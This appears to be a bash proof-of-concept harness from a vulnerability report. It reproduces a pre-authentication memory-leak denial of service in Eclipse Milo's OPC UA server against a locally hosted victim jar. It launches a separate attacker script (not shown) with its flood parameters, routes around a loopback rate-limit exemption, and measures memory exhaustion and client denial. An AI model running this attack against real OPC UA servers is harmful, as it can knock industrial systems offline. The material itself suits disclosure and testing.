#!/usr/bin/env bash
#
# UASC pre-authentication memory-leak PoC -- Scenario A: bounded direct-memory cap
# (-XX:MaxDirectMemorySize=64m), JVM survives the caught OutOfMemoryError.
#
# Runs entirely on the host (no Docker) using the standalone victim-server jar. The
# attacker deliberately targets the host's real LAN IP address, NOT 127.0.0.1/localhost:
# Milo's RateLimitingHandler exempts loopback peers outright, so testing against
# 127.0.0.1 would not exercise it. isLoopbackAddress() is false for a routable LAN
# address even when the traffic loops back to the same machine, so this genuinely
# activates the rate limiter without requiring a second host.
#
# Demonstrates:
#   - pinned direct memory climbing to a plateau near the 64 MiB cap
#   - a forced GC (jcmd GC.run) NOT reclaiming it
#   - a genuine "OutOfMemoryError: Cannot reserve ... direct buffer memory" thrown
#     from UascServerAsymmetricHandler
#   - whether legitimate clients are still served (degradation) or denied (A:H)
#
# Usage: ./scenarioA.sh <JAR_PATH> <LABEL> <RESULTS_FILE>
set -u
cd "$(dirname "$0")"

JAVA_HOME="${JAVA_HOME:-}"
if [ -z "$JAVA_HOME" ]; then
  for c in "/Users/abhinavagarwal/.local/share/mise/installs/java/temurin-17.0.19+10" "$(mise where java 2>/dev/null)"; do
    if [ -n "$c" ] && [ -x "$c/bin/java" ]; then JAVA_HOME="$c"; break; fi
  done
fi
export JAVA_HOME
export PATH="$JAVA_HOME/bin:$PATH"

JAR_PATH="${1:-victim-server/target-versions/victim-server-1.1.4.jar}"
LABEL="${2:-vulnerable-1.1.4}"
RESULTS="${3:-scenarioA-${LABEL}.log}"

: > "$RESULTS"
log(){ echo "$@" | tee -a "$RESULTS"; }
hr(){ log "============================================================"; }

# Real LAN IP, not loopback -- required for the rate limiter to be genuinely active.
HOST_IP="$(ipconfig getifaddr en0 2>/dev/null)"
[ -z "$HOST_IP" ] && HOST_IP="$(ipconfig getifaddr en1 2>/dev/null)"
if [ -z "$HOST_IP" ]; then
  log "ERROR: could not determine a non-loopback host IP (tried en0/en1)."
  exit 1
fi
ENDPOINT="opc.tcp://${HOST_IP}:12686/milo"

hr; log "UASC pre-authentication memory-leak PoC -- Scenario A  label=$LABEL jar=$JAR_PATH  $(date -u +%FT%TZ)"; hr
log "host non-loopback IP (attacker target, proves RateLimitingHandler is active): $HOST_IP"
log "java: $(java -version 2>&1 | head -1)"

SEC_DIR="/tmp/memory-leak-scenarioA-${LABEL}-security"
rm -rf "$SEC_DIR"
SVR_LOG="/tmp/memory-leak-scenarioA-${LABEL}-server.log"
: > "$SVR_LOG"

log ""; log "[1/9] Start victim server (-Xmx256m -XX:MaxDirectMemorySize=64m, bound 0.0.0.0:12686)"
java -Djava.io.tmpdir="$SEC_DIR" -Xmx256m -XX:MaxDirectMemorySize=64m \
  -XX:NativeMemoryTracking=summary \
  -Dorg.slf4j.simpleLogger.showDateTime=true \
  -Dorg.slf4j.simpleLogger.dateTimeFormat=HH:mm:ss.SSS \
  -Dorg.slf4j.simpleLogger.defaultLogLevel=info \
  -Dorg.slf4j.simpleLogger.log.org.eclipse.milo.opcua.stack.transport.server.tcp.RateLimitingHandler=debug \
  -Dorg.slf4j.simpleLogger.log.org.eclipse.milo.opcua.stack.transport.server.uasc.UascServerHelloHandler=debug \
  -cp "$JAR_PATH" poc.VictimServer > "$SVR_LOG" 2>&1 &
SVR_PID=$!
log "    server pid (host) = $SVR_PID"

n=0
until grep -q POC_SERVER_READY "$SVR_LOG" 2>/dev/null; do
  sleep 1; n=$((n+1))
  if [ "$n" -gt 60 ]; then log "ERROR: server did not become ready"; tail -30 "$SVR_LOG" | tee -a "$RESULTS"; exit 1; fi
done
JAVA_PID=$(grep -o 'pid=[0-9]*' "$SVR_LOG" | head -1 | cut -d= -f2)
log "    server ready, in-process pid=$JAVA_PID"

pinned() { grep -o 'pinnedDirectBytes=[0-9]*' "$SVR_LOG" | tail -1 | cut -d= -f2; }
pinned_peak() { grep -o 'pinnedDirectBytes=[0-9]*' "$SVR_LOG" | cut -d= -f2 | awk 'BEGIN{m=0}{if($1+0>m)m=$1}END{print m+0}'; }
mib() { awk -v b="${1:-0}" 'BEGIN{printf "%.2f", b/1048576}'; }

run_legit() {
  local label="$1" tmo="${2:-25}"
  local out line
  out=$(java -Dlegit.timeout.sec="$tmo" -Dorg.slf4j.simpleLogger.defaultLogLevel=warn \
        -cp "$JAR_PATH" poc.LegitClient "$ENDPOINT" 2>&1)
  line=$(echo "$out" | grep -E 'LEGIT_CLIENT_RESULT' | tail -1)
  [ -z "$line" ] && line="LEGIT_CLIENT_RESULT=FAILURE reason=no_result"
  # A bare "Connection reset" (as opposed to a WATCHDOG_TIMEOUT hang, which is a real
  # denial signal) is host-loopback TCP flakiness from running the attacker and probe
  # from the same machine at the same time, not evidence of memory exhaustion. Retry
  # once so a single transient reset doesn't get misreported as a memory-driven denial.
  if echo "$line" | grep -q 'Connection reset' && ! echo "$line" | grep -q WATCHDOG_TIMEOUT; then
    echo "    $label -> $line (RETRYING once -- looked like transient reset, not a hang)" >>"$RESULTS"
    sleep 1
    out=$(java -Dlegit.timeout.sec="$tmo" -Dorg.slf4j.simpleLogger.defaultLogLevel=warn \
          -cp "$JAR_PATH" poc.LegitClient "$ENDPOINT" 2>&1)
    line=$(echo "$out" | grep -E 'LEGIT_CLIENT_RESULT' | tail -1)
    [ -z "$line" ] && line="LEGIT_CLIENT_RESULT=FAILURE reason=no_result"
  fi
  echo "    $label -> $line" >>"$RESULTS"
  echo "$line"
}

BEFORE=$(pinned); BEFORE=${BEFORE:-0}
log ""; log "[2/9] BEFORE attack -- baseline memory + legit connectivity"
log "    pinnedDirect BEFORE = $(mib "$BEFORE") MiB ($BEFORE bytes)"
BASE_RESULT=$(run_legit "baseline, pre-attack")
log "    $BASE_RESULT"
if ! echo "$BASE_RESULT" | grep -q SUCCESS; then
  log "FATAL: legit client did not succeed BEFORE the attack -- baseline is broken, aborting."
  kill "$SVR_PID" 2>/dev/null
  exit 2
fi

log ""; log "[3/9] ATTACK -- raw-socket UASC OPN 'C'-chunk leak against ${ENDPOINT} (non-loopback)"
ATK_LOG="/tmp/memory-leak-scenarioA-${LABEL}-attacker.log"
( cd attacker && TARGET_HOST="$HOST_IP" TARGET_PORT=12686 ENDPOINT_URL="$ENDPOINT" \
  DURATION_SEC=120 CHUNKS_PER_CONN=64 CHUNK_SIZE=65535 INTER_CONN_SLEEP=0.30 \
  python3 attacker.py > "$ATK_LOG" 2>&1 & echo $! > /tmp/memory-leak-scenarioA-${LABEL}-atk.pid )
sleep 1
ATK_PID=$(cat /tmp/memory-leak-scenarioA-${LABEL}-atk.pid)
log "    attacker started pid=$ATK_PID (detached, ~3 conns/s while rate limiter active); ramping..."

SAT=0
for t in $(seq 1 60); do
  P=$(pinned); P=${P:-0}
  if [ $((t % 5)) -eq 0 ]; then log "    t+${t}s pinnedDirect=$(mib "$P") MiB"; fi
  if [ "$P" -ge 47185920 ]; then SAT=1; log "    SATURATED at t+${t}s: pinnedDirect=$(mib "$P") MiB (>=45 MiB)"; break; fi
  sleep 1
done
[ "$SAT" -eq 0 ] && log "    NOTE: did not reach 45 MiB in 60s; proceeding with whatever level was reached"

log ""; log "[4/9] IMPACT (DURING attack) -- 3 concurrent legit probes under saturation"
DENY_OK=0; DENY_FAIL=0
for p in 1 2 3; do
  R=$(run_legit "DURING attack, probe #$p" 20)
  case "$R" in
    *SUCCESS*) DENY_OK=$((DENY_OK+1));;
    *FAILURE*) DENY_FAIL=$((DENY_FAIL+1));;
  esac
  log "    probe#$p: $R"
done

DURING=$(pinned_peak); DURING=${DURING:-0}
log "    pinnedDirect PEAK = $(mib "$DURING") MiB ($DURING bytes)"
log ""; log "    --- non-loopback / rate-limiter-active proof (server-side logs) ---"
grep -Eo 'remote=/[0-9.]+:[0-9]+' "$SVR_LOG" | sort -u | head -5 | sed 's/^/    /' | tee -a "$RESULTS"
log "    RateLimitingHandler Accepting/Rejecting lines:"
grep -E 'RateLimitingHandler' "$SVR_LOG" | grep -E 'Accepting|Rejecting' | tail -6 | sed 's/^/      /' | tee -a "$RESULTS"
REJECTS=$(grep -c 'Rejecting connection' "$SVR_LOG")
OOME=$(grep -ic 'OutOfMemoryError' "$SVR_LOG")
log "    server-side 'Rejecting connection' count = $REJECTS"
log "    genuine direct-memory OutOfMemoryError occurrences = $OOME"
log "    sample verbatim OOME from server:"
grep -iE 'Cannot reserve .* direct buffer memory' "$SVR_LOG" | head -2 | sed 's/^/      /' | tee -a "$RESULTS"

log ""; log "[5/9] Force GC (jcmd GC.run) -- prove leaked direct memory is NOT reclaimable"
PRE_GC=$(pinned); PRE_GC=${PRE_GC:-0}
log "    pinnedDirect just BEFORE forced GC = $(mib "$PRE_GC") MiB"
jcmd "$JAVA_PID" GC.run >>"$RESULTS" 2>&1
sleep 3
AFTER_GC=$(pinned); AFTER_GC=${AFTER_GC:-0}
log "    pinnedDirect AFTER forced GC          = $(mib "$AFTER_GC") MiB"

log ""; log "[6/9] Stop attacker; collect its stats"
if kill -0 "$ATK_PID" 2>/dev/null; then kill "$ATK_PID" 2>/dev/null; fi
sleep 1
LEAKING=$(grep -Eo 'leakingConns=[0-9]+' "$ATK_LOG" | tail -1 | cut -d= -f2)
THROTTLED=$(grep -Eo 'throttledConns=[0-9]+' "$ATK_LOG" | tail -1 | cut -d= -f2)
[ -z "$LEAKING" ] && LEAKING=$(grep -c 'LEAK conn#' "$ATK_LOG")
THROTTLED=${THROTTLED:-0}
BYTES_SENT=$((${LEAKING:-0} * 64 * 65535))
log "    attacker: leakingConns=$LEAKING throttledConns=$THROTTLED bytesSent=$BYTES_SENT ($(mib "$BYTES_SENT") MiB)"

log ""; log "[7/9] Legit client AFTER attacker stopped (server still saturated)"
DENY_RESULT=$(run_legit "post-attack, attacker stopped")
log "    $DENY_RESULT"

log ""; log "[8/9] RECOVERY -- restart server, prove only restart recovers the leaked memory"
kill "$SVR_PID" 2>/dev/null
sleep 4
rm -rf "$SEC_DIR"
mv "$SVR_LOG" "${SVR_LOG}.pre-restart"
SVR_LOG="${SVR_LOG}.post-restart"
: > "$SVR_LOG"
java -Djava.io.tmpdir="$SEC_DIR" -Xmx256m -XX:MaxDirectMemorySize=64m \
  -Dorg.slf4j.simpleLogger.defaultLogLevel=warn -cp "$JAR_PATH" poc.VictimServer > "$SVR_LOG" 2>&1 &
SVR_PID=$!
n=0
until grep -q POC_SERVER_READY "$SVR_LOG" 2>/dev/null; do
  sleep 1; n=$((n+1)); [ "$n" -gt 60 ] && break
done
RECOVER_PINNED=$(pinned); RECOVER_PINNED=${RECOVER_PINNED:-0}
log "    server restarted, pinnedDirect=$(mib "$RECOVER_PINNED") MiB"
RECOVER_RESULT=$(run_legit "post-restart")
log "    $RECOVER_RESULT"

log ""; log "[9/9] Teardown"
kill "$SVR_PID" 2>/dev/null
rm -rf "$SEC_DIR"

LEAK_PER="n/a"
if [ "${LEAKING:-0}" -gt 0 ]; then
  LEAK_PER=$(awk -v d="$DURING" -v b="$BEFORE" -v n="$LEAKING" 'BEGIN{printf "%.3f", (d-b)/1048576/n}')
fi
A_VERDICT="NOT demonstrated (server degraded but legit clients still served)"
if [ "${DENY_FAIL:-0}" -gt 0 ] && [ "${OOME:-0}" -gt 0 ]; then
  A_VERDICT="DEMONSTRATED (${DENY_FAIL}/3 concurrent legit probes DENIED under live attack, with genuine direct-memory OOME on the server)"
elif [ "${DENY_FAIL:-0}" -gt 0 ]; then
  A_VERDICT="INCONCLUSIVE (${DENY_FAIL}/3 probe(s) failed but server logged 0 direct-memory OOME events -- likely unrelated to the leak, see raw logs)"
fi

FAIL=0
if ! echo "$RECOVER_RESULT" | grep -q SUCCESS; then
  log "!! CHECK FAILED: legit client did not succeed AFTER restart (unexpected)"
  FAIL=1
fi

hr; log "SUMMARY -- Scenario A ($LABEL)"; hr
log "attacker target                 : $ENDPOINT (non-loopback host IP)"
log "leaking (accepted) attacker conns: ${LEAKING:-0}   throttled: ${THROTTLED} (rate limiter active)"
log "server-side rejections           : ${REJECTS}"
log "pinnedDirect BEFORE              : $(mib "$BEFORE") MiB"
log "pinnedDirect PEAK (during attack) : $(mib "$DURING") MiB  (cap 64 MiB)"
log "pinnedDirect AFTER forced GC      : $(mib "$AFTER_GC") MiB  (unchanged from peak = GC reclaimed nothing)"
log "approx MiB leaked per accepted conn: ${LEAK_PER}"
log "genuine direct-memory OOME events: ${OOME}"
log "legit BEFORE attack               : ${BASE_RESULT}"
log "legit DURING attack (concurrent)  : ${DENY_OK} SUCCESS / ${DENY_FAIL} FAILURE (of 3 probes)"
log "legit AFTER attacker stopped      : ${DENY_RESULT}"
log "legit AFTER restart               : ${RECOVER_RESULT}"
log "pinnedDirect AFTER restart        : $(mib "$RECOVER_PINNED") MiB (back to baseline -- proves only restart recovers)"
log "Scenario A remote A:H verdict     : ${A_VERDICT}"
hr
log "transcript: $(pwd)/$RESULTS"
log "raw server log (attack phase): ${SVR_LOG}.pre-restart"
log "raw server log (post-restart) : $SVR_LOG"
log "raw attacker log: $ATK_LOG"
log "machine-checked verdict: $([ "$FAIL" -eq 0 ] && echo PASS || echo FAIL) (exit $FAIL)"
exit $FAIL
